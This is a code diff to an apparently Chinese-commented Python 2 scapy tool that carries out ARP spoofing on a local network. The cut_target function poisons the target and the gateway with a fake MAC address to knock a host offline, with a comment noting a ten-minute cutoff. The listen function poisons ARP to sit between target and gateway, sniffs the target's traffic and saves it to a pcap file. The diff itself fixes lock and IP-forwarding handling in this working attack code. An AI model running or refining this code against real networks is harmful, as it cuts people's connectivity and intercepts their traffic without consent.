@@ -39,7 +39,7 @@ class Nct():
         self.hosts = []
         self.ip_format = self.ip_section[0:-1]+'0/24'
         self.sniff_status = False
-
+        set_ip_forwarding(1)
 
 
 
@@ -84,6 +84,7 @@ class Nct():
                 logger.info("ip {0}: is not in rules ,ip is {1}".format(host[0],host[1]))
 
     def cut_target(self,gateway_ip, gateway_mac, target_ip, target_mac):
+        WRONG_MAC = "11:11:11:22:22:22"
         # 构建欺骗目标的ARP请求()，这里没设置hwsrc,默认就是本机咯
         # 简单来说：告诉被攻击机器，本机（攻击机）的mac是网关，就是攻击者的机器是网关
         poison_target = ARP()
@@ -91,6 +92,7 @@ class Nct():
         poison_target.psrc = gateway_ip  # 模拟是网关发出的, 其实是我们的机器发出的
         poison_target.pdst = target_ip  # 目的地是目标机器
         poison_target.hwdst = target_mac  # 目标的物理地址是目标机器的mac
+        poison_target.hwsrc = WRONG_MAC
 
         # 构建欺骗网关的ARP请求()，这里没设置hwsrc,默认就是本机咯
         poison_gateway = ARP()
@@ -98,7 +100,7 @@ class Nct():
         poison_gateway.psrc = target_ip  # 模拟是目标机器发出的,
         poison_gateway.pdst = gateway_ip  # 目的地是网关
         poison_gateway.hwdst = gateway_mac  # 目标的物理地址是网关的mac
-
+        poison_gateway.hwsrc = WRONG_MAC
         print "[*] Beginning the ARP attack. ［CTRL_C to stop］"
 
         while LOCK_CUT:
@@ -115,7 +117,10 @@ class Nct():
         print "[*] ARP poison attack finished"
         return
 
+
     def cut_it(self,target_ip,target_mac):
+        global LOCK_CUT
+        LOCK_CUT = True
         conf.verb = 0
         cut_thread = Job(target=self.cut_target, args=(GATEWAY, GATEWAY_MAC, target_ip, target_mac))
         cut_thread.setDaemon(True)
@@ -124,7 +129,7 @@ class Nct():
             print "[*] Starting attack  {} mac:{}".format(target_ip,target_mac)
             time.sleep(TIME)#断网十分钟
 
-            global LOCK_CUT
+            #global LOCK_CUT
             LOCK_CUT = False
             cut_thread.stop()
 
@@ -133,6 +138,7 @@ class Nct():
             return True
         except KeyboardInterrupt:
             # 还原网络配置
+            LOCK_CUT = False
             restore_target(GATEWAY, GATEWAY_MAC, target_ip, target_mac)
             return False
 
@@ -212,7 +218,9 @@ class Nct():
         return
 
     def listen(self,target_ip,target_mac):
-        set_ip_forwarding(1)
+        global LOCK_LISTEN
+        LOCK_LISTEN = True
+        #set_ip_forwarding(1)
         conf.verb = 0
         GATEWAY_MAC = get_mac(GATEWAY)
         packet_count = COUNT
@@ -230,20 +238,20 @@ class Nct():
             #time.sleep(5)
             # 将捕获到的数据包输出到文件
 
-            global LOCK_LISTEN
+            #global LOCK_LISTEN
             LOCK_LISTEN = False
             poison_thread.stop()
             #sniff_thread.stop()
             wrpcap('{}.pcap'.format(target_ip), packets)
             # 还原网络配置
             restore_target(GATEWAY, GATEWAY_MAC, target_ip, target_mac)
-            set_ip_forwarding(0)
+            #set_ip_forwarding(0)
             return True
         except Exception,e:
+            LOCK_LISTEN = False
             print e
             # 还原网络配置
             restore_target(GATEWAY, GATEWAY_MAC, target_ip, target_mac)
-            set_ip_forwarding(0)
             return False
 
     def policy(self,host_ip,host_mac):
